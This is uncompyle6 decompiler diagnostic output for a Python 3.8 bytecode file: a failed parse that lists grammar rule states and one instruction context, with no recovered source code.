# uncompyle6 version 3.9.0
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 2.7.18 (default, Aug  1 2022, 06:23:55) 
# [GCC 12.1.0]
# Embedded file name: <k>

-- Stacks of completed symbols:
START ::= |- stmts . 
_come_froms ::= \e__come_froms . COME_FROM
_come_froms ::= \e__come_froms . COME_FROM_LOOP
_stmts ::= _stmts . stmt
_stmts ::= _stmts stmt . 
_stmts ::= stmt . 
and ::= expr . JUMP_IF_FALSE_OR_POP expr \e_come_from_opt
and ::= expr . JUMP_IF_FALSE_OR_POP expr come_from_opt
and ::= expr . jifop_come_from expr
and ::= expr . jmp_false expr
and ::= expr . jmp_false expr COME_FROM
and ::= expr . jmp_false expr jmp_false
and_not ::= expr . jmp_false expr POP_JUMP_IF_TRUE
assert2 ::= expr . jmp_true LOAD_GLOBAL expr CALL_FUNCTION_1 RAISE_VARARGS_1
assign ::= expr . DUP_TOP designList
assign ::= expr . store
assign ::= expr store . 
assign2 ::= expr . expr ROT_TWO store store
assign2 ::= expr expr . ROT_TWO store store
assign3 ::= expr . expr expr ROT_THREE ROT_TWO store store store
assign3 ::= expr expr . expr ROT_THREE ROT_TWO store store store
assign3 ::= expr expr expr . ROT_THREE ROT_TWO store store store
async_for_stmt38 ::= expr . async_for store for_block COME_FROM_FINALLY END_ASYNC_FOR
async_forelse_stmt38 ::= expr . GET_AITER SETUP_FINALLY GET_ANEXT LOAD_CONST YIELD_FROM POP_BLOCK store for_block COME_FROM_FINALLY END_ASYNC_FOR else_suite
attribute ::= expr . LOAD_ATTR
attribute37 ::= expr . LOAD_METHOD
attribute37 ::= expr LOAD_METHOD . 
aug_assign1 ::= expr . expr inplace_op ROT_THREE STORE_SUBSCR
aug_assign1 ::= expr . expr inplace_op store
aug_assign1 ::= expr expr . inplace_op ROT_THREE STORE_SUBSCR
aug_assign1 ::= expr expr . inplace_op store
aug_assign2 ::= expr . DUP_TOP LOAD_ATTR expr inplace_op ROT_TWO STORE_ATTR
await_expr ::= expr . GET_AWAITABLE LOAD_CONST YIELD_FROM
bin_op ::= expr . expr binary_operator
bin_op ::= expr expr . binary_operator
bin_op ::= expr expr binary_operator . 
binary_operator ::= BINARY_ADD . 
binary_operator ::= BINARY_MULTIPLY . 
call ::= expr . CALL_FUNCTION_0
call ::= expr . CALL_METHOD_0
call ::= expr . expr CALL_METHOD_1
call ::= expr . pos_arg CALL_FUNCTION_1
call ::= expr . pos_arg pos_arg CALL_FUNCTION_2
call ::= expr CALL_FUNCTION_0 . 
call ::= expr CALL_METHOD_0 . 
call ::= expr expr . CALL_METHOD_1
call ::= expr pos_arg . CALL_FUNCTION_1
call ::= expr pos_arg . pos_arg CALL_FUNCTION_2
call ::= expr pos_arg CALL_FUNCTION_1 . 
call ::= expr pos_arg pos_arg . CALL_FUNCTION_2
call ::= expr pos_arg pos_arg CALL_FUNCTION_2 . 
call_kw36 ::= expr . expr LOAD_CONST CALL_FUNCTION_KW_1
call_kw36 ::= expr . expr expr expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr . LOAD_CONST CALL_FUNCTION_KW_1
call_kw36 ::= expr expr . expr expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr LOAD_CONST . CALL_FUNCTION_KW_1
call_kw36 ::= expr expr expr . expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr expr expr . LOAD_CONST CALL_FUNCTION_KW_3
call_stmt ::= call . 
call_stmt ::= expr . POP_TOP
classdefdeco1 ::= expr . classdefdeco1 CALL_FUNCTION_1
classdefdeco1 ::= expr . classdefdeco2 CALL_FUNCTION_1
compare_chained ::= expr . compare_chained1 ROT_TWO POP_TOP \e__come_froms
compare_chained ::= expr . compare_chained1 ROT_TWO POP_TOP _come_froms
compare_chained1 ::= expr . DUP_TOP ROT_THREE COMPARE_OP JUMP_IF_FALSE_OR_POP compare_chained1 COME_FROM
compare_chained1 ::= expr . DUP_TOP ROT_THREE COMPARE_OP JUMP_IF_FALSE_OR_POP compare_chained2 COME_FROM
compare_chained1_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2b_false_37 POP_TOP _jump COME_FROM
compare_chained1_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2c_37 POP_TOP JUMP_FORWARD COME_FROM
compare_chained1a_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE
compare_chained1a_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_37 COME_FROM POP_TOP COME_FROM
compare_chained1b_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2b_false_37 POP_TOP _jump COME_FROM
compare_chained1c_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_37 POP_TOP
compare_chained2_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_false_37 POP_TOP JUMP_BACK COME_FROM
compare_chained37 ::= expr . compare_chained1a_37
compare_chained37 ::= expr . compare_chained1c_37
compare_chained37_false ::= expr . compare_chained1_false_37
compare_chained37_false ::= expr . compare_chained1b_false_37
compare_chained37_false ::= expr . compare_chained2_false_37
compare_single ::= expr . expr COMPARE_OP
compare_single ::= expr expr . COMPARE_OP
continues ::= _stmts . lastl_stmt continue
dict ::= expr . expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr . expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr . expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr . expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= kvlist_0 . 
dict_comp_func ::= BUILD_MAP_0 . LOAD_ARG for_iter store comp_iter JUMP_BACK RETURN_VALUE RETURN_LAST
expr ::= LOAD_CONST . 
expr ::= LOAD_FAST . 
expr ::= LOAD_GLOBAL . 
expr ::= LOAD_STR . 
expr ::= attribute37 . 
expr ::= bin_op . 
expr ::= call . 
expr ::= dict . 
expr_jit ::= expr . JUMP_IF_TRUE
expr_jitop ::= expr . JUMP_IF_TRUE_OR_POP
expr_jt ::= expr . jmp_true
expr_pjit ::= expr . POP_JUMP_IF_TRUE
expr_pjit_come_from ::= expr . POP_JUMP_IF_TRUE COME_FROM
expr_stmt ::= expr . POP_TOP
for38 ::= expr . get_for_iter store for_block
for38 ::= expr . get_for_iter store for_block JUMP_BACK
for38 ::= expr . get_for_iter store for_block JUMP_BACK POP_BLOCK
for38 ::= expr . get_iter store for_block JUMP_BACK
forelselaststmt38 ::= expr . get_for_iter store for_block POP_BLOCK else_suitec
forelselaststmtl38 ::= expr . get_for_iter store for_block POP_BLOCK else_suitel
forelsestmt38 ::= expr . get_for_iter store for_block JUMP_BACK \e__come_froms else_suite
forelsestmt38 ::= expr . get_for_iter store for_block JUMP_BACK _come_froms else_suite
forelsestmt38 ::= expr . get_for_iter store for_block POP_BLOCK else_suite
formatted_value1 ::= expr . FORMAT_VALUE
formatted_value_debug ::= LOAD_STR . formatted_value1 BUILD_STRING_2
formatted_value_debug ::= LOAD_STR . formatted_value2 BUILD_STRING_2
get_iter ::= expr . GET_ITER
if_exp ::= expr . jmp_false expr jf_cf expr COME_FROM
if_exp ::= expr . jmp_false expr jump_absolute_else expr
if_exp37 ::= expr . expr jf_cfs expr COME_FROM
if_exp37 ::= expr expr . jf_cfs expr COME_FROM
if_exp_37b ::= expr . jmp_false expr POP_JUMP_IF_FALSE jump_forward_else expr
if_exp_lambda ::= expr . jmp_false expr return_if_lambda return_stmt_lambda LAMBDA_MARKER
if_exp_not ::= expr . jmp_true expr jump_forward_else expr COME_FROM
if_exp_not_lambda ::= expr . jmp_true expr return_if_lambda return_stmt_lambda LAMBDA_MARKER
if_exp_true ::= expr . JUMP_FORWARD expr COME_FROM
joined_str ::= expr . expr BUILD_STRING_2
joined_str ::= expr expr . BUILD_STRING_2
kvlist_0 ::= BUILD_MAP_0 . 
kvlist_1 ::= expr . expr BUILD_MAP_1
kvlist_1 ::= expr expr . BUILD_MAP_1
l_stmts ::= _stmts . 
l_stmts ::= _stmts . lastl_stmt
l_stmts ::= l_stmts . lstmt
l_stmts ::= l_stmts lstmt . 
l_stmts ::= lstmt . 
lambda_body ::= expr . LOAD_LAMBDA LOAD_STR MAKE_FUNCTION_4
lstmt ::= stmt . 
mkfunc ::= expr . LOAD_CODE LOAD_STR MAKE_FUNCTION_4
mkfuncdeco ::= expr . mkfuncdeco CALL_FUNCTION_1
mkfuncdeco ::= expr . mkfuncdeco0 CALL_FUNCTION_1
named_expr ::= expr . DUP_TOP store
pop_ex_return ::= return_expr . ROT_FOUR POP_EXCEPT RETURN_VALUE
popb_return ::= return_expr . POP_BLOCK RETURN_VALUE
pos_arg ::= expr . 
ret_and ::= expr . JUMP_IF_FALSE_OR_POP return_expr_or_cond COME_FROM
ret_or ::= expr . JUMP_IF_TRUE_OR_POP return_expr_or_cond COME_FROM
return ::= return_expr . RETURN_END_IF
return ::= return_expr . RETURN_VALUE
return ::= return_expr . RETURN_VALUE COME_FROM
return ::= return_expr . discard_tops RETURN_VALUE
return_expr ::= expr . 
return_expr_lambda ::= return_expr . RETURN_VALUE_LAMBDA
return_expr_lambda ::= return_expr . RETURN_VALUE_LAMBDA LAMBDA_MARKER
return_if_stmt ::= return_expr . RETURN_END_IF
return_if_stmt ::= return_expr . RETURN_END_IF POP_BLOCK
returns ::= _stmts . return
returns ::= _stmts . return_if_stmt
sstmt ::= sstmt . RETURN_LAST
sstmt ::= stmt . 
stmt ::= assign . 
stmt ::= call_stmt . 
stmts ::= sstmt . 
stmts ::= stmts . sstmt
stmts ::= stmts sstmt . 
store ::= STORE_FAST . 
store ::= expr . STORE_ATTR
store_subscript ::= expr . expr STORE_SUBSCR
store_subscript ::= expr expr . STORE_SUBSCR
subscript ::= expr . expr BINARY_SUBSCR
subscript ::= expr expr . BINARY_SUBSCR
subscript2 ::= expr . expr DUP_TOP_TWO BINARY_SUBSCR
subscript2 ::= expr expr . DUP_TOP_TWO BINARY_SUBSCR
testfalse ::= expr . jmp_false
testfalse_not_and ::= expr . jmp_false expr jmp_true COME_FROM
testfalse_not_or ::= expr . jmp_false expr jmp_false COME_FROM
testfalsel ::= expr . jmp_true
testtrue ::= expr . jmp_true
tuple ::= expr . expr BUILD_TUPLE_2
tuple ::= expr expr . BUILD_TUPLE_2
unary_not ::= expr . UNARY_NOT
unary_op ::= expr . unary_operator
while1stmt ::= \e__come_froms . l_stmts COME_FROM JUMP_BACK COME_FROM_LOOP
while1stmt ::= \e__come_froms l_stmts . COME_FROM JUMP_BACK COME_FROM_LOOP
whileTruestmt ::= \e__come_froms . l_stmts JUMP_BACK POP_BLOCK
whileTruestmt ::= \e__come_froms l_stmts . JUMP_BACK POP_BLOCK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK COME_FROM_EXCEPT_CLAUSE
whileTruestmt38 ::= \e__come_froms . pass JUMP_BACK
whileTruestmt38 ::= \e__come_froms \e_pass . JUMP_BACK
whileTruestmt38 ::= \e__come_froms l_stmts . JUMP_BACK
whileTruestmt38 ::= \e__come_froms l_stmts . JUMP_BACK COME_FROM_EXCEPT_CLAUSE
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr l_stmts come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr returns POP_BLOCK
yield ::= expr . YIELD_VALUE
yield_from ::= expr . GET_YIELD_FROM_ITER LOAD_CONST YIELD_FROM
Instruction context:
-> 
 L.  27        64  MAP_ADD               1  ''

-- Stacks of completed symbols:
START ::= |- stmts . 
_come_froms ::= \e__come_froms . COME_FROM
_come_froms ::= \e__come_froms . COME_FROM_LOOP
and ::= expr . JUMP_IF_FALSE_OR_POP expr \e_come_from_opt
and ::= expr . JUMP_IF_FALSE_OR_POP expr come_from_opt
and ::= expr . jifop_come_from expr
and ::= expr . jmp_false expr
and ::= expr . jmp_false expr COME_FROM
and ::= expr . jmp_false expr jmp_false
and_not ::= expr . jmp_false expr POP_JUMP_IF_TRUE
assert2 ::= expr . jmp_true LOAD_GLOBAL expr CALL_FUNCTION_1 RAISE_VARARGS_1
assign ::= expr . DUP_TOP designList
assign ::= expr . store
assign2 ::= expr . expr ROT_TWO store store
assign2 ::= expr expr . ROT_TWO store store
assign3 ::= expr . expr expr ROT_THREE ROT_TWO store store store
assign3 ::= expr expr . expr ROT_THREE ROT_TWO store store store
assign3 ::= expr expr expr . ROT_THREE ROT_TWO store store store
async_for_stmt38 ::= expr . async_for store for_block COME_FROM_FINALLY END_ASYNC_FOR
async_forelse_stmt38 ::= expr . GET_AITER SETUP_FINALLY GET_ANEXT LOAD_CONST YIELD_FROM POP_BLOCK store for_block COME_FROM_FINALLY END_ASYNC_FOR else_suite
attribute ::= expr . LOAD_ATTR
attribute ::= expr LOAD_ATTR . 
attribute37 ::= expr . LOAD_METHOD
aug_assign1 ::= expr . expr inplace_op ROT_THREE STORE_SUBSCR
aug_assign1 ::= expr . expr inplace_op store
aug_assign1 ::= expr expr . inplace_op ROT_THREE STORE_SUBSCR
aug_assign1 ::= expr expr . inplace_op store
aug_assign2 ::= expr . DUP_TOP LOAD_ATTR expr inplace_op ROT_TWO STORE_ATTR
await_expr ::= expr . GET_AWAITABLE LOAD_CONST YIELD_FROM
bin_op ::= expr . expr binary_operator
bin_op ::= expr expr . binary_operator
call ::= expr . CALL_FUNCTION_0
call ::= expr . CALL_METHOD_0
call ::= expr . expr CALL_METHOD_1
call ::= expr . pos_arg CALL_FUNCTION_1
call ::= expr . pos_arg pos_arg CALL_FUNCTION_2
call ::= expr expr . CALL_METHOD_1
call ::= expr pos_arg . CALL_FUNCTION_1
call ::= expr pos_arg . pos_arg CALL_FUNCTION_2
call ::= expr pos_arg pos_arg . CALL_FUNCTION_2
call_kw36 ::= expr . expr LOAD_CONST CALL_FUNCTION_KW_1
call_kw36 ::= expr . expr expr LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr . expr expr expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr . LOAD_CONST CALL_FUNCTION_KW_1
call_kw36 ::= expr expr . expr LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr expr . expr expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr expr . LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr expr expr . expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr expr expr . LOAD_CONST CALL_FUNCTION_KW_3
call_stmt ::= expr . POP_TOP
classdefdeco1 ::= expr . classdefdeco1 CALL_FUNCTION_1
classdefdeco1 ::= expr . classdefdeco2 CALL_FUNCTION_1
compare_chained ::= expr . compare_chained1 ROT_TWO POP_TOP \e__come_froms
compare_chained ::= expr . compare_chained1 ROT_TWO POP_TOP _come_froms
compare_chained1 ::= expr . DUP_TOP ROT_THREE COMPARE_OP JUMP_IF_FALSE_OR_POP compare_chained1 COME_FROM
compare_chained1 ::= expr . DUP_TOP ROT_THREE COMPARE_OP JUMP_IF_FALSE_OR_POP compare_chained2 COME_FROM
compare_chained1_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2b_false_37 POP_TOP _jump COME_FROM
compare_chained1_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2c_37 POP_TOP JUMP_FORWARD COME_FROM
compare_chained1a_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE
compare_chained1a_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_37 COME_FROM POP_TOP COME_FROM
compare_chained1b_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2b_false_37 POP_TOP _jump COME_FROM
compare_chained1c_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_37 POP_TOP
compare_chained2_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_false_37 POP_TOP JUMP_BACK COME_FROM
compare_chained37 ::= expr . compare_chained1a_37
compare_chained37 ::= expr . compare_chained1c_37
compare_chained37_false ::= expr . compare_chained1_false_37
compare_chained37_false ::= expr . compare_chained1b_false_37
compare_chained37_false ::= expr . compare_chained2_false_37
compare_single ::= expr . expr COMPARE_OP
compare_single ::= expr expr . COMPARE_OP
dict ::= expr . expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr . expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr . expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr expr . expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr expr expr . expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr expr expr expr . expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= kvlist_0 . 
expr ::= LOAD_GLOBAL . 
expr ::= LOAD_STR . 
expr ::= attribute . 
expr ::= dict . 
expr_jit ::= expr . JUMP_IF_TRUE
expr_jitop ::= expr . JUMP_IF_TRUE_OR_POP
expr_jt ::= expr . jmp_true
expr_pjit ::= expr . POP_JUMP_IF_TRUE
expr_pjit_come_from ::= expr . POP_JUMP_IF_TRUE COME_FROM
expr_stmt ::= expr . POP_TOP
for38 ::= expr . get_for_iter store for_block
for38 ::= expr . get_for_iter store for_block JUMP_BACK
for38 ::= expr . get_for_iter store for_block JUMP_BACK POP_BLOCK
for38 ::= expr . get_iter store for_block JUMP_BACK
forelselaststmt38 ::= expr . get_for_iter store for_block POP_BLOCK else_suitec
forelselaststmtl38 ::= expr . get_for_iter store for_block POP_BLOCK else_suitel
forelsestmt38 ::= expr . get_for_iter store for_block JUMP_BACK \e__come_froms else_suite
forelsestmt38 ::= expr . get_for_iter store for_block JUMP_BACK _come_froms else_suite
forelsestmt38 ::= expr . get_for_iter store for_block POP_BLOCK else_suite
formatted_value1 ::= expr . FORMAT_VALUE
formatted_value_debug ::= LOAD_STR . formatted_value1 BUILD_STRING_2
formatted_value_debug ::= LOAD_STR . formatted_value2 BUILD_STRING_2
get_iter ::= expr . GET_ITER
if_exp ::= expr . jmp_false expr jf_cf expr COME_FROM
if_exp ::= expr . jmp_false expr jump_absolute_else expr
if_exp37 ::= expr . expr jf_cfs expr COME_FROM
if_exp37 ::= expr expr . jf_cfs expr COME_FROM
if_exp_37b ::= expr . jmp_false expr POP_JUMP_IF_FALSE jump_forward_else expr
if_exp_lambda ::= expr . jmp_false expr return_if_lambda return_stmt_lambda LAMBDA_MARKER
if_exp_not ::= expr . jmp_true expr jump_forward_else expr COME_FROM
if_exp_not_lambda ::= expr . jmp_true expr return_if_lambda return_stmt_lambda LAMBDA_MARKER
if_exp_true ::= expr . JUMP_FORWARD expr COME_FROM
joined_str ::= expr . expr BUILD_STRING_2
joined_str ::= expr expr . BUILD_STRING_2
kvlist_0 ::= BUILD_MAP_0 . 
kvlist_1 ::= expr . expr BUILD_MAP_1
kvlist_1 ::= expr expr . BUILD_MAP_1
lambda_body ::= expr . LOAD_LAMBDA LOAD_STR MAKE_FUNCTION_4
mkfunc ::= expr . LOAD_CODE LOAD_STR MAKE_FUNCTION_4
mkfuncdeco ::= expr . mkfuncdeco CALL_FUNCTION_1
mkfuncdeco ::= expr . mkfuncdeco0 CALL_FUNCTION_1
named_expr ::= expr . DUP_TOP store
pop_ex_return ::= return_expr . ROT_FOUR POP_EXCEPT RETURN_VALUE
popb_return ::= return_expr . POP_BLOCK RETURN_VALUE
pos_arg ::= expr . 
ret_and ::= expr . JUMP_IF_FALSE_OR_POP return_expr_or_cond COME_FROM
ret_or ::= expr . JUMP_IF_TRUE_OR_POP return_expr_or_cond COME_FROM
return ::= return_expr . RETURN_END_IF
return ::= return_expr . RETURN_VALUE
return ::= return_expr . RETURN_VALUE COME_FROM
return ::= return_expr . discard_tops RETURN_VALUE
return_expr ::= expr . 
return_expr_lambda ::= return_expr . RETURN_VALUE_LAMBDA
return_expr_lambda ::= return_expr . RETURN_VALUE_LAMBDA LAMBDA_MARKER
store ::= expr . STORE_ATTR
store_subscript ::= expr . expr STORE_SUBSCR
store_subscript ::= expr expr . STORE_SUBSCR
subscript ::= expr . expr BINARY_SUBSCR
subscript ::= expr expr . BINARY_SUBSCR
subscript2 ::= expr . expr DUP_TOP_TWO BINARY_SUBSCR
subscript2 ::= expr expr . DUP_TOP_TWO BINARY_SUBSCR
testfalse ::= expr . jmp_false
testfalse_not_and ::= expr . jmp_false expr jmp_true COME_FROM
testfalse_not_or ::= expr . jmp_false expr jmp_false COME_FROM
testfalsel ::= expr . jmp_true
testtrue ::= expr . jmp_true
tuple ::= expr . expr BUILD_TUPLE_2
tuple ::= expr expr . BUILD_TUPLE_2
unary_not ::= expr . UNARY_NOT
unary_op ::= expr . unary_operator
while1stmt ::= \e__come_froms . l_stmts COME_FROM JUMP_BACK COME_FROM_LOOP
whileTruestmt ::= \e__come_froms . l_stmts JUMP_BACK POP_BLOCK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK COME_FROM_EXCEPT_CLAUSE
whileTruestmt38 ::= \e__come_froms . pass JUMP_BACK
whileTruestmt38 ::= \e__come_froms \e_pass . JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr l_stmts come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr returns POP_BLOCK
yield ::= expr . YIELD_VALUE
yield_from ::= expr . GET_YIELD_FROM_ITER LOAD_CONST YIELD_FROM

-- Stacks of completed symbols:
START ::= |- stmts . 
_come_froms ::= \e__come_froms . COME_FROM
_come_froms ::= \e__come_froms . COME_FROM_LOOP
_stmts ::= _stmts . stmt
_stmts ::= stmt . 
add_consts ::= \e_add_consts . ADD_VALUE
add_consts ::= \e_add_consts ADD_VALUE . 
add_consts ::= add_consts . ADD_VALUE
add_consts ::= add_consts ADD_VALUE . 
and ::= expr . JUMP_IF_FALSE_OR_POP expr \e_come_from_opt
and ::= expr . JUMP_IF_FALSE_OR_POP expr come_from_opt
and ::= expr . jifop_come_from expr
and ::= expr . jmp_false expr
and ::= expr . jmp_false expr COME_FROM
and ::= expr . jmp_false expr jmp_false
and_not ::= expr . jmp_false expr POP_JUMP_IF_TRUE
assert2 ::= expr . jmp_true LOAD_GLOBAL expr CALL_FUNCTION_1 RAISE_VARARGS_1
assign ::= expr . DUP_TOP designList
assign ::= expr . store
assign2 ::= expr . expr ROT_TWO store store
assign2 ::= expr expr . ROT_TWO store store
assign3 ::= expr . expr expr ROT_THREE ROT_TWO store store store
assign3 ::= expr expr . expr ROT_THREE ROT_TWO store store store
assign3 ::= expr expr expr . ROT_THREE ROT_TWO store store store
async_for_stmt38 ::= expr . async_for store for_block COME_FROM_FINALLY END_ASYNC_FOR
async_forelse_stmt38 ::= expr . GET_AITER SETUP_FINALLY GET_ANEXT LOAD_CONST YIELD_FROM POP_BLOCK store for_block COME_FROM_FINALLY END_ASYNC_FOR else_suite
attribute ::= expr . LOAD_ATTR
attribute ::= expr LOAD_ATTR . 
attribute37 ::= expr . LOAD_METHOD
aug_assign1 ::= expr . expr inplace_op ROT_THREE STORE_SUBSCR
aug_assign1 ::= expr . expr inplace_op store
aug_assign1 ::= expr expr . inplace_op ROT_THREE STORE_SUBSCR
aug_assign1 ::= expr expr . inplace_op store
aug_assign2 ::= expr . DUP_TOP LOAD_ATTR expr inplace_op ROT_TWO STORE_ATTR
await_expr ::= expr . GET_AWAITABLE LOAD_CONST YIELD_FROM
bin_op ::= expr . expr binary_operator
bin_op ::= expr expr . binary_operator
bin_op ::= expr expr binary_operator . 
binary_operator ::= BINARY_ADD . 
call ::= expr . CALL_FUNCTION_0
call ::= expr . CALL_METHOD_0
call ::= expr . expr CALL_METHOD_1
call ::= expr . pos_arg CALL_FUNCTION_1
call ::= expr . pos_arg pos_arg CALL_FUNCTION_2
call ::= expr expr . CALL_METHOD_1
call ::= expr pos_arg . CALL_FUNCTION_1
call ::= expr pos_arg . pos_arg CALL_FUNCTION_2
call ::= expr pos_arg pos_arg . CALL_FUNCTION_2
call_kw36 ::= expr . expr LOAD_CONST CALL_FUNCTION_KW_1
call_kw36 ::= expr . expr expr LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr . expr expr expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr . LOAD_CONST CALL_FUNCTION_KW_1
call_kw36 ::= expr expr . expr LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr expr . expr expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr LOAD_CONST . CALL_FUNCTION_KW_1
call_kw36 ::= expr expr expr . LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr expr expr . expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr expr LOAD_CONST . CALL_FUNCTION_KW_2
call_kw36 ::= expr expr expr expr . LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr expr expr LOAD_CONST . CALL_FUNCTION_KW_3
call_kw36 ::= expr expr expr expr LOAD_CONST CALL_FUNCTION_KW_3 . 
call_stmt ::= expr . POP_TOP
call_stmt ::= expr POP_TOP . 
classdefdeco1 ::= expr . classdefdeco1 CALL_FUNCTION_1
classdefdeco1 ::= expr . classdefdeco2 CALL_FUNCTION_1
compare_chained ::= expr . compare_chained1 ROT_TWO POP_TOP \e__come_froms
compare_chained ::= expr . compare_chained1 ROT_TWO POP_TOP _come_froms
compare_chained1 ::= expr . DUP_TOP ROT_THREE COMPARE_OP JUMP_IF_FALSE_OR_POP compare_chained1 COME_FROM
compare_chained1 ::= expr . DUP_TOP ROT_THREE COMPARE_OP JUMP_IF_FALSE_OR_POP compare_chained2 COME_FROM
compare_chained1_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2b_false_37 POP_TOP _jump COME_FROM
compare_chained1_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2c_37 POP_TOP JUMP_FORWARD COME_FROM
compare_chained1a_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE
compare_chained1a_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_37 COME_FROM POP_TOP COME_FROM
compare_chained1b_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2b_false_37 POP_TOP _jump COME_FROM
compare_chained1c_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_37 POP_TOP
compare_chained2_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_false_37 POP_TOP JUMP_BACK COME_FROM
compare_chained37 ::= expr . compare_chained1a_37
compare_chained37 ::= expr . compare_chained1c_37
compare_chained37_false ::= expr . compare_chained1_false_37
compare_chained37_false ::= expr . compare_chained1b_false_37
compare_chained37_false ::= expr . compare_chained2_false_37
compare_single ::= expr . expr COMPARE_OP
compare_single ::= expr expr . COMPARE_OP
const_list ::= COLLECTION_START . add_consts BUILD_CONST_DICT
